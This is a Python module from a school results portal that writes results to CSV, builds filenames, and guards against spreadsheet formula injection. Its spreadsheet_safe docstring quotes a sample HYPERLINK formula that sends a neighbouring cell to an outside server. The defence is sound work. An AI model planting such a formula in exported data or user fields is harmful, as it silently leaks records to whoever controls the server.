"""CSV export.

Every CSV the portal produces comes from here, in one row shape, so a file a
student downloads and a file an administrator downloads describe the same
result identically.

The source is always the results table. Nothing here ever reads back an
uploaded file: a mark corrected through the portal is the mark that appears in
the download, because the download is generated from the record, not from
whatever was originally imported.
"""

import csv
import io
import re
from typing import Iterable, List, Optional, Sequence

from app.models.result import Result

# --------------------------------------------------------------- safety

# Excel, LibreOffice and Google Sheets treat a cell opening with any of these
# as a formula rather than as text.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")

_PLAIN_NUMBER = re.compile(r"^[+-]?\d+(\.\d+)?$")


def spreadsheet_safe(value) -> str:
    """Stop a stored value being executed as a formula by a spreadsheet.

    Names and remarks are typed by people, and a CSV is nearly always opened
    in Excel rather than read as text. A remark of

        =HYPERLINK("http://elsewhere/?"&A1,"Click")

    is inert in the database and inert in the portal, but becomes a live
    formula the moment the file is opened - one that can quietly send the row
    beside it to somebody else's server. Prefixing an apostrophe is the
    spreadsheet convention for "this is text": it is not shown as part of the
    value, and the cell stops being executable.

    Numbers pass through untouched, so a mark of -5 stays -5 rather than
    becoming text and breaking arithmetic in the sheet.
    """
    if value is None:
        return ""
    text = str(value)
    if not text:
        return text
    if text[0] in _FORMULA_LEAD and not _PLAIN_NUMBER.match(text):
        return "'" + text
    return text

# The export format. Fixed and shared, so every download is the same shape.
CSV_COLUMNS = [
    "student_number",
    "student_name",
    "class",
    "subject",
    "marks",
    "grade",
    "remarks",
    "term",
    "academic_year",
    "examination",
]


def result_row(result: Result) -> List[str]:
    """One result as a CSV row, read straight from the database record."""
    student = result.student
    exam = result.examination
    term = exam.term if exam else None

    return [
        student.student_number if student else "",
        student.full_name if student else "",
        student.school_class.name if student and student.school_class else "",
        result.subject.name if result.subject else "",
        # Two decimals, so 67.5 and 67.50 never look like different marks.
        f"{result.marks:.2f}" if result.marks is not None else "",
        result.grade or "",
        result.remarks or "",
        term.name if term else "",
        term.academic_year.name if term and term.academic_year else "",
        exam.name if exam else "",
    ]


def _sort_key(result: Result):
    """Student, then subject: the order somebody reading the file expects."""
    student = result.student
    return (
        student.last_name if student else "",
        student.first_name if student else "",
        result.subject.name if result.subject else "",
    )


def write_csv(results: Iterable[Result]) -> str:
    """Render results as CSV in the standard export format."""
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\n")
    writer.writerow(CSV_COLUMNS)

    for result in sorted(results, key=_sort_key):
        writer.writerow([spreadsheet_safe(cell) for cell in result_row(result)])

    return buffer.getvalue()


def build_filename(*parts: Optional[str], suffix: str = "Results") -> str:
    """Compose a download filename from the school, period and scope.

        Presbyterian_High_School_Term_2_STU001_Results.csv

    Punctuation and spacing are collapsed to single underscores so the name
    survives every filesystem and email client it will pass through.
    """
    pieces: List[str] = []
    for part in [*parts, suffix]:
        if not part:
            continue
        cleaned = re.sub(r"[^A-Za-z0-9]+", "_", str(part)).strip("_")
        if cleaned:
            pieces.append(cleaned)

    name = "_".join(pieces) or "Results"
    # Collapse any run of underscores the joins may have produced.
    return re.sub(r"_{2,}", "_", name)


def csv_filename(
    school_name: Optional[str],
    term_name: Optional[str] = None,
    scope: Optional[str] = None,
    suffix: str = "Results",
) -> str:
    """The filename for a results CSV, with its extension."""
    return build_filename(school_name, term_name, scope, suffix=suffix) + ".csv"


def term_and_scope(results: Sequence[Result]) -> tuple:
    """Infer the term and, for a single student, their number, for the filename."""
    if not results:
        return None, None

    exam = results[0].examination
    term = exam.term.name if exam and exam.term else None

    numbers = {r.student.student_number for r in results if r.student}
    scope = next(iter(numbers)) if len(numbers) == 1 else None
    return term, scope
